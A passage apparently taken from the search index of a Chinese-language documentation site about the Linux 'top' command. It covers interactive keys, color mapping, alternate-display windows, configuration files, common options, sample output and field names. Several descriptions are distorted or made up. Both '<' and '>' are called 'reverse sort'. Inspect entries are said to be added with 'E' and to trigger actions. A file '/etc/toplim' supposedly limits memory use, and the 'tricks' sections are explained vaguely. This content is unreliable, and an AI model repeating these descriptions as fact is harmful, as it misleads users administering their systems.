\u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u5207\u6362\u4e3a\u6811\u72b6\u89c6\u56fe\uff0c\u663e\u793a\u4efb\u52a1\u7684\u7236\u5b50\u5173\u7cfb\u3002 v : \u5b50\u8fdb\u7a0b\u9690\u85cf\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u4efb\u52a1\u7684\u5b50\u8fdb\u7a0b\u3002 \u5927\u5c0f: # : \u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 i : \u7a7a\u95f2\u4efb\u52a1\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u7a7a\u95f2\u4efb\u52a1\u3002 n : \u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 \u6392\u5e8f: < : \u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 > : \u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 f : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 F : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 R : \u9ed8\u8ba4\u6392\u5e8f\u6062\u590d \u6b64\u547d\u4ee4\u5c06\u6392\u5e8f\u6062\u590d\u4e3a\u9ed8\u8ba4\u6392\u5e8f\u5b57\u6bb5\u548c\u987a\u5e8f\u3002 4d. \u989c\u8272\u6620\u5c04 \u989c\u8272\u6620\u5c04\u547d\u4ee4\u4ec5\u5728\u989c\u8272\u6620\u5c04\u6a21\u5f0f\u4e0b\u53ef\u7528\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `Z` \u4ea4\u4e92\u547d\u4ee4\u548c `z` \u4ea4\u4e92\u547d\u4ee4\u3002 <Ret> : \u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u75280\u52307\u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 a : \u989c\u8272A \u9009\u62e9\u989c\u8272\u6620\u5c04A\u3002 B : \u989c\u8272B \u9009\u62e9\u989c\u8272\u6620\u5c04B\u3002 b : \u989c\u8272B \u9009\u62e9\u989c\u8272\u6620\u5c04B\u3002 H : \u9ad8\u4eae\u989c\u8272 \u9009\u62e9\u9ad8\u4eae\u989c\u8272\u3002 M : \u666e\u901a\u989c\u8272 \u9009\u62e9\u666e\u901a\u989c\u8272\u3002 q : \u9000\u51fa\u989c\u8272\u6620\u5c04 \u9000\u51fa\u989c\u8272\u6620\u5c04\u9009\u62e9\u3002 S : \u4fdd\u5b58\u989c\u8272\u6620\u5c04 \u4fdd\u5b58\u5f53\u524d\u7684\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u3002 T : \u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 w : \u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 z : \u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 0 - 7 : \u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u75280\u52307\u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 5a. \u7a97\u53e3\u6982\u8ff0 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0ctop\u63d0\u4f9b\u4e86\u989d\u5916\u7684\u7a97\u53e3\uff0c\u7528\u4e8e\u5c55\u793a\u4e0d\u540c\u7684\u4efb\u52a1\u548c\u7cfb\u7edf\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528`A`\u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u53ef\u4ee5\u5355\u72ec\u914d\u7f6e\uff0c\u663e\u793a\u4e0d\u540c\u7684\u5b57\u6bb5\u548c\u6392\u5e8f\u987a\u5e8f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u63d0\u4f9b\u56db\u4e2a\u7a97\u53e3\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528`g`\u4ea4\u4e92\u547d\u4ee4\u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u6709\u81ea\u5df1\u7684\u5b57\u6bb5\u7ec4\u548c\u6392\u5e8f\u987a\u5e8f\uff0c\u5141\u8bb8\u4f60\u5b9a\u5236\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u7684\u4fe1\u606f\u3002 5b. \u7a97\u53e3\u547d\u4ee4 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u7ba1\u7406\u7a97\u53e3\uff1a - : \u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 _ : \u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 = : \u91cd\u7f6e\u7a97\u53e3\u5927\u5c0f \u91cd\u7f6e\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 + : \u589e\u52a0\u7a97\u53e3\u5bbd\u5ea6 \u589e\u52a0\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 A : \u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 a : \u7a97\u53e3\u6dfb\u52a0 \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7a97\u53e3\u3002 g : \u9009\u62e9\u7a97\u53e3 \u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002 G : \u7a97\u53e3\u5220\u9664 \u5220\u9664\u5f53\u524d\u7a97\u53e3\u3002 w : \u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u7a97\u53e3\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 5c. \u7a97\u53e3\u6eda\u52a8 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u6eda\u52a8\u7a97\u53e3\u5185\u5bb9\uff1a C : \u5149\u6807\u63a7\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u542f\u7528\u6216\u7981\u7528\u5149\u6807\u63a7\u5236\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u7a97\u53e3\u5185\u5bb9\u4e0a\u8fdb\u884c\u5bfc\u822a\u3002 Up : \u5411\u4e0a\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u884c\u3002 Dn : \u5411\u4e0b\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u884c\u3002 Left : \u5411\u5de6\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u5de6\u6eda\u52a8\u4e00\u5217\u3002 Right : \u5411\u53f3\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u53f3\u6eda\u52a8\u4e00\u5217\u3002 PgUp : \u5411\u4e0a\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u9875\u3002 PgDn : \u5411\u4e0b\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u9875\u3002 Home : \u8df3\u5230\u5f00\u5934 \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u5f00\u5934\u3002 End : \u8df3\u5230\u7ed3\u5c3e \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u7ed3\u5c3e\u3002 5d. \u7a97\u53e3\u641c\u7d22 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\uff1a L : \u5173\u952e\u5b57\u641c\u7d22 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\u5339\u914d\u9879\u3002 & : \u5b57\u6bb5\u8fc7\u6ee4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\u548c\u4e00\u4e2a\u503c\uff0c\u4ee5\u4fbf\u4ec5\u663e\u793a\u5339\u914d\u8be5\u5b57\u6bb5\u503c\u7684\u4efb\u52a1\u3002 6. \u6587\u4ef6 6a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 top \u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u4fdd\u5b58\u4f60\u5bf9 top \u754c\u9762\u548c\u884c\u4e3a\u7684\u6240\u6709\u81ea\u5b9a\u4e49\u8bbe\u7f6e\u3002\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e2d\uff0c\u540d\u4e3a `.toprc`\u3002 \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u7684\u8bbe\u7f6e\u5305\u62ec\uff1a\u5b57\u6bb5\u548c\u6392\u5e8f\u3001\u6458\u8981\u533a\u57df\u8bbe\u7f6e\u3001\u5ef6\u8fdf\u65f6\u95f4\u3001\u989c\u8272\u6620\u5c04\u7b49\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 `W` \u4ea4\u4e92\u547d\u4ee4\u5c06\u5f53\u524d\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 6b. \u6dfb\u52a0\u68c0\u67e5\u6761\u76ee \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u68c0\u67e5\u6761\u76ee\u6765\u76d1\u63a7\u7279\u5b9a\u8fdb\u7a0b\u6216\u7cfb\u7edf\u72b6\u6001\u3002\u68c0\u67e5\u6761\u76ee\u5b9a\u4e49\u4e86\u6761\u4ef6\uff0c\u5f53\u8fd9\u4e9b\u6761\u4ef6\u6ee1\u8db3\u65f6\uff0ctop \u5c06\u53d1\u51fa\u8b66\u544a\u6216\u6267\u884c\u64cd\u4f5c\u3002 \u6bcf\u4e2a\u68c0\u67e5\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a - \u540d\u79f0 - \u6761\u4ef6\u8868\u8fbe\u5f0f - \u52a8\u4f5c - \u4f18\u5148\u7ea7 \u4f60\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7684\u68c0\u67e5\u6761\u76ee\uff0c\u6216\u7f16\u8f91\u73b0\u6709\u7684\u68c0\u67e5\u6761\u76ee\u3002 6c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e `/etc/toprc`\uff0c\u7528\u4e8e\u5b9a\u4e49\u7cfb\u7edf\u8303\u56f4\u7684 top \u8bbe\u7f6e\u3002\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u76f8\u540c\uff0c\u4f46\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4f4d\u4e8e `/etc/toplim`\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9 top \u64cd\u4f5c\u7684\u9650\u5236\u3002\u8fd9\u4e9b\u9650\u5236\u5305\u62ec\uff1a\u6700\u5927\u4efb\u52a1\u6570\u3001\u6700\u5927\u5b57\u6bb5\u6570\u3001\u6700\u5927\u5185\u5b58\u4f7f\u7528\u7b49\u3002 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u5c06\u8986\u76d6\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u3002 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 7a. \u5185\u6838\u9b54\u672f \u4f60\u53ef\u4ee5\u4f7f\u7528 top \u7684\u4ea4\u4e92\u547d\u4ee4\u6765\u67e5\u770b\u548c\u64cd\u4f5c\u5185\u6838\u53c2\u6570\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 `k` \u547d\u4ee4\u53ef\u4ee5\u6740\u6b7b\u4efb\u52a1\uff0c\u4f7f\u7528 `r` \u547d\u4ee4\u53ef\u4ee5\u8c03\u6574\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 7b. \u7a97\u53e3\u5f39\u8df3 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 `a` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7a97\u53e3\uff0c\u5e76\u901a\u8fc7 `g` \u547d\u4ee4\u5728\u7a97\u53e3\u4e4b\u95f4\u5207\u6362\u3002\u8fd9\u6837\u53ef\u4ee5\u540c\u65f6\u76d1\u63a7\u591a\u4e2a\u8fdb\u7a0b\u548c\u7cfb\u7edf\u72b6\u6001\u3002 7c. \u5927\u9e1f\u7a97\u53e3 \u4f7f\u7528 top \u7684\u989c\u8272\u6620\u5c04\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u5c06\u91cd\u8981\u7684\u4efb\u52a1\u6216\u72b6\u6001\u7a81\u51fa\u663e\u793a\u4e3a\u4e0d\u540c\u7684\u989c\u8272\u3002\u8fd9\u6837\u53ef\u4ee5\u5728\u5927\u91cf\u4fe1\u606f\u4e2d\u5feb\u901f\u8bc6\u522b\u5173\u952e\u6570\u636e\u3002 7d. \u4ea4\u6362\u7a97\u53e3 \u4f7f\u7528 top \u7684\u7a97\u53e3\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u7a97\u53e3\uff0c\u5206\u522b\u663e\u793a\u4e0d\u540c\u7684\u4fe1\u606f\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 `G` \u547d\u4ee4\u5220\u9664\u4e0d\u9700\u8981\u7684\u7a97\u53e3\uff0c\u6216\u4f7f\u7528 `A` \u547d\u4ee4\u5207\u6362\u663e\u793a\u6a21\u5f0f\u3002 8. \u9519\u8bef \u5982\u679c\u4f60\u5728\u4f7f\u7528 top \u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u8bf7\u53c2\u9605 top \u7684\u624b\u518c\u9875\u6216\u5728\u7ebf\u6587\u6863\u83b7\u53d6\u5e2e\u52a9\u3002 9. \u53c2\u89c1 \u6709\u5173 top \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u8d44\u6e90\uff1a - man \u9875\uff1aman top - \u5728\u7ebf\u6587\u6863\uff1ahttps://man7.org/linux/man-pages/man1/top.1.html","title":"top\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/top/#top","text":"","title":"top\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/top/#_1","text":"$ top -d 1 \u6307\u5b9a\u5237\u65b0\u5c4f\u5e55\u65f6\u95f4\u95f4\u9694 $ top -d 1 -p 10126 \u67e5\u770b\u6307\u5b9a\u8fdb\u7a0b\u7684\u52a8\u6001\u4fe1\u606f $ top -d 1 -p 10126,1 \u67e5\u770b\u591a\u4e2a\u6307\u5b9a\u8fdb\u7a0b\u7684\u52a8\u6001\u4fe1\u606f $ top -d 1 -u apache \u67e5\u770b\u6307\u5b9a\u7528\u6237\u7684\u8fdb\u7a0b $ top -d 1 -b -n 2 > top.txt \u5c062\u6b21top\u4fe1\u606f\u5199\u5165\u5230\u6587\u4ef6 $ top -o %MEM \u6309\u7167\u5185\u5b58\u6392\u5e8f\uff0c\u4ece\u5927\u5230\u5c0f $ top -H \u663e\u793a\u7ebf\u7a0b","title":"\u5e38\u7528\u547d\u4ee4\u9009\u9879"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/top/#_2","text":"$ top top - 16:23:05 up 68 days, 23:07, 1 user, load average: 0.00, 0.01, 0.05 Tasks: 116 total, 1 running, 115 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.1 us, 0.1 sy, 0.0 ni, 99.8 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 8008632 total, 4764280 free, 428308 used, 2816044 buff/cache KiB Swap: 0 total, 0 free, 0 used. 7262552 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1188 root 20 0 50088 1116 780 S 1.0 0.0 1082:03 rshim 8916 root 20 0 1095744 158952 19256 S 0.7 2.0 819:23.35 YDService 1 root 20 0 43700 4044 2600 S 0.0 0.1 1:08.24 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:02.46 kthreadd 4 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 6 root 20 0 0 0 0 S 0.0 0.0 0:02.74 ksoftirqd/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.37 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 2:37.36 rcu_sched 10 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 lru-add-drain 11 root rt 0 0 0 0 S 0.0 0.0 0:13.19 watchdog/0 12 root rt 0 0 0 0 S 0.0 0.0 0:11.66 watchdog/1 13 root rt 0 0 0 0 S 0.0 0.0 0:00.37 migration/1 14 root 20 0 0 0 0 S 0.0 0.0 0:01.30 ksoftirqd/1 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/1:0H 17 root rt 0 0 0 0 S 0.0 0.0 0:11.60 watchdog/2 18 root rt 0 0 0 0 S 0.0 0.0 0:00.41 migration/2 19 root 20 0 0 0 0 S 0.0 0.0 0:00.54 ksoftirqd/2 21 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/2:0H 22 root rt 0 0 0 0 S 0.0 0.0 0:11.20 watchdog/3 23 root rt 0 0 0 0 S 0.0 0.0 0:00.36 migration/3 24 root 20 0 0 0 0 S 0.0 0.0 0:00.53 ksoftirqd/3 26 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/3:0H 28 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 29 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 30 root 20 0 0 0 0 S 0.0 0.0 0:01.39 khungtaskd PID\uff1a \u8fdb\u7a0bID USER: \u8fd0\u884c\u8fdb\u7a0b\u7684\u7528\u6237 PR\uff1a\u4efb\u52a1\u7684\u8ba1\u5212\u4f18\u5148\u7ea7 NI\uff1anice\u503c VIRT: \u8fdb\u7a0b\u865a\u62df\u5185\u5b58\u5927\u5c0f RES: \u8fdb\u7a0b\u5e38\u9a7b\u5185\u5b58\u5927\u5c0f\uff0c\u4e0d\u5305\u62ecSwap SHR: \u5171\u4eab\u5185\u5b58\u5927\u5c0f %MEM: \u8fdb\u7a0b\u5360\u7528\u7269\u7406\u5185\u5b58\u5360\u7cfb\u7edf\u603b\u5185\u5b58\u7684\u767e\u5206\u6bd4 TIME+\uff1aCPU\u65f6\u95f4\uff0c\u663e\u793a\u9ad8\u7cbe\u5ea6 COMMAND\uff1a\u8fdb\u7a0b\u540d\u5b57 S\uff1a\u8fdb\u7a0b\u72b6\u6001\u3002\u4e0b\u9762\u8fdb\u7a0b\u72b6\u6001\u5176\u4e2d\u4e4b\u4e00 D = \u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001 R = \u8fd0\u884c\u6216\u8005\u53ef\u8fd0\u884c\u72b6\u6001 S = \u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720 T = \u6682\u505c\u6216\u8005 t = \u8ddf\u8e2a\u72b6\u6001 Z = \u50f5\u5c38\u8fdb\u7a0b","title":"\u5e38\u89c1\u6807\u9898\u89e3\u91ca"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/top/#_3","text":"$ top \u547d\u4ee4\u8f93\u5165\u540e \u6309f\uff0c\u53ef\u914d\u7f6e\u663e\u793a\u7684\u5217 * PID = Process Id DATA = Data+Stack (KiB) * USER = Effective User Name nMaj = Major Page Faults * PR = Priority nMin = Minor Page Faults * NI = Nice Value nDRT = Dirty Pages Count * VIRT = Virtual Image (KiB) WCHAN = Sleeping in Function * RES = Resident Size (KiB) Flags = Task Flags <sched.h> * SHR = Shared Memory (KiB) CGROUPS = Control Groups * S = Process Status SUPGIDS = Supp Groups IDs * %CPU = CPU Usage SUPGRPS = Supp Groups Names * %MEM = Memory Usage (RES) TGID = Thread Group Id * TIME+ = CPU Time, hundredths ENVIRON = Environment vars * COMMAND = Command Name/Line vMj = Major Faults delta PPID = Parent Process pid vMn = Minor Faults delta UID = Effective User Id USED = Res+Swap Size (KiB) RUID = Real User Id nsIPC = IPC namespace Inode RUSER = Real User Name nsMNT = MNT namespace Inode SUID = Saved User Id nsNET = NET namespace Inode SUSER = Saved User Name nsPID = PID namespace Inode GID = Group Id nsUSER = USER namespace Inode GROUP = Group Name nsUTS = UTS namespace Inode PGRP = Process Group Id TTY = Controlling Tty TPGID = Tty Process Grp Id SID = Session Id nTH = Number of Threads P = Last Used Cpu (SMP) TIME = CPU Time SWAP = Swapped Size (KiB) CODE = Code Size (KiB) M \u6309\u5185\u5b58\u7684\u4f7f\u7528\u6392\u5e8f P \u6309CPU\u4f7f\u7528\u6392\u5e8f N \u4ee5PID\u7684\u5927\u5c0f\u6392\u5e8f R \u5bf9\u6392\u5e8f\u8fdb\u884c\u53cd\u8f6c f \u81ea\u5b9a\u4e49\u663e\u793a\u5b57\u6bb5 1 \u663e\u793a\u6240\u6709CPU\u7684\u8d1f\u8f7d W \u5bf9\u66f4\u6539\u8fdb\u884c\u4fdd\u5b58 z \u66f4\u6539\u4e3b\u9898\u989c\u8272 Z \u5bf9\u4e3b\u9898\u989c\u8272\u8fdb\u884c\u914d\u7f6e,\u8fdb\u5165\u914d\u7f6e\u754c\u9762\u540e\uff0c0-7\u9009\u62e9\u989c\u8272\uff0ca,w\u9009\u62e9\u663e\u793a\u5185\u5bb9\uff0c\u56de\u8f66\u4fdd\u5b58 q \u8fd4\u56de e \u5207\u6362\u5355\u4f4d E \u5207\u6362\u5355\u4f4d H \u5207\u6362\u7ebf\u7a0b\u663e\u793a\u6a21\u5f0f h \u67e5\u770b\u4ea4\u4e92\u547d\u4ee4\u5e2e\u52a9 top\uff081\uff09 - Linux \u624b\u518c\u9875 (man7.org) top\u7684man\u4e2d\u6587\u624b\u518c TOP(1) \u7528\u6237\u547d\u4ee4 TOP(1) \u540d\u79f0 top - \u663e\u793a Linux \u8fdb\u7a0b \u7b80\u4ecb top -hv|-bcEeHiOSs1 -d \u79d2 -n \u6b21\u6570 -u|U \u7528\u6237 -p \u8fdb\u7a0bID -o \u5b57\u6bb5 -w [\u5217] \u4f20\u7edf\u7684\u5f00\u5173 `-' \u548c\u7a7a\u767d\u7b26\u662f\u53ef\u9009\u7684\u3002 \u63cf\u8ff0 top \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u52a8\u6001\u7684\u5b9e\u65f6\u89c6\u56fe\uff0c\u53ef\u4ee5\u663e\u793a\u6b63\u5728\u8fd0\u884c\u7684\u7cfb\u7edf\u4fe1\u606f\u3002\u5b83\u53ef\u4ee5\u663e\u793a\u7cfb\u7edf\u6982\u8981\u4fe1\u606f\u4ee5\u53ca\u5f53\u524d\u7531 Linux \u5185\u6838\u7ba1\u7406\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u5217\u8868\u3002\u663e\u793a\u7684\u7cfb\u7edf\u6982\u8981\u4fe1\u606f\u7c7b\u578b\u4ee5\u53ca\u8fdb\u7a0b\u4fe1\u606f\u7684\u7c7b\u578b\u3001\u987a\u5e8f\u548c\u5927\u5c0f\u90fd\u53ef\u4ee5\u7531\u7528\u6237\u914d\u7f6e\uff0c \u5e76\u4e14\u8fd9\u79cd\u914d\u7f6e\u53ef\u4ee5\u5728\u91cd\u542f\u540e\u4fdd\u6301\u3002 \u8be5\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6709\u9650\u7684\u4ea4\u4e92\u754c\u9762\u7528\u4e8e\u8fdb\u7a0b\u64cd\u4f5c\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u4e3a\u5e7f\u6cdb\u7684\u754c\u9762\u7528\u4e8e\u4e2a\u4eba\u914d\u7f6e\uff0c\u6db5\u76d6\u5176\u64cd\u4f5c\u7684\u5404\u4e2a\u65b9\u9762\u3002 \u867d\u7136\u672c\u6587\u6863\u4e2d\u63d0\u5230\u7684\u662f top\uff0c\u4f60\u53ef\u4ee5\u968f\u610f\u547d\u540d\u8be5\u7a0b\u5e8f\u3002\u8fd9\u4e2a\u65b0\u540d\u5b57\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u522b\u540d\uff0c\u5c06\u4f1a\u5728 top \u7684\u663e\u793a\u4e2d\u53cd\u6620\u51fa\u6765\uff0c \u5e76\u5728\u8bfb\u53d6\u548c\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u65f6\u4f7f\u7528\u3002 \u6982\u8ff0 \u6587\u6863 \u4f59\u4e0b\u7684\u76ee\u5f55 \u6982\u8ff0 \u64cd\u4f5c Linux \u5185\u5b58\u7c7b\u578b 1. \u547d\u4ee4\u884c\u9009\u9879 2. \u6982\u8981\u663e\u793a a. \u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u548c\u8d1f\u8f7d\u5e73\u5747\u503c b. \u4efb\u52a1\u548cCPU\u72b6\u6001 c. \u5185\u5b58\u4f7f\u7528\u60c5\u51b5 3. \u5b57\u6bb5/\u5217\u663e\u793a a. \u5b57\u6bb5\u63cf\u8ff0 b. \u7ba1\u7406\u5b57\u6bb5 4. \u4ea4\u4e92\u547d\u4ee4 a. \u5168\u5c40\u547d\u4ee4 b. \u6982\u8981\u533a\u57df\u547d\u4ee4 c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 1. \u5916\u89c2 2. \u5185\u5bb9 3. \u5927\u5c0f 4. \u6392\u5e8f d. \u989c\u8272\u6620\u5c04 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 a. \u7a97\u53e3\u6982\u8ff0 b. \u7a97\u53e3\u547d\u4ee4 c. \u7a97\u53e3\u6eda\u52a8 d. \u7a97\u53e3\u641c\u7d22 e. \u7a97\u53e3\u8fc7\u6ee4 6. \u6587\u4ef6 a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 b. 